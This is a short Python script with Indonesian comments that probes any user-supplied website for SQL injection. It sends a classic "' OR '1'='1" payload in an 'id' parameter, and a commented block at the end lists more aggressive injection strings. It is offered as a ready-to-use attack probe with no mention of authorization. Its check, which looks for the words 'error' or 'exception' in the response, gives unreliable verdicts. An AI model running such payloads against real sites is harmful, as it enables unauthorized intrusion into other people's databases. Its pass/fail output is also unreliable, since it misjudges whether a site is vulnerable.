import requests

def cek_vuln_gak(url):
    try:
        # Kalian bisa menambahkan beberapa payload!
        payload = {"id": "' OR '1'='1"}
        response = requests.get(url, params=payload)

        # Jika vuln/rentan... Maka akan diberitahu! | bukan diberi tempe :v
        if "error" in response.text.lower() or "exception" in response.text.lower():
            print(f"URL {url} rentan terhadap serangan SQL injection!")
   	# Dan jika tidak...
        else:
            print(f"URL {url} tidak rentan terhadap serangan SQL injection.")
    except requests.exceptions.RequestException as e:
        print(f"Gagal mengirim permintaan ke {url}: {e}")

if __name__ == "__main__":
    url = input("Input situs/web: ").strip()
    cek_vuln_gak(url)


# ----------------------------------------------------
# UNTUK MENGGUNAKAN PAYLOAD YANG LEBIH AGRESIF...    |
# TO USE A MORE AGGRESSIVE PAYLOAD... 👇             |
# ----------------------------------------------------


#    payloads = ["' OR '1'='1", "' OR '1'='1'; --", "' OR '1'='1' /*", "' OR '1'='1'--",
#                "' OR '1'='1' --+", "') OR ('1'='1--", "') OR ('1'='1'; --", "') OR ('1'='1' /*"]

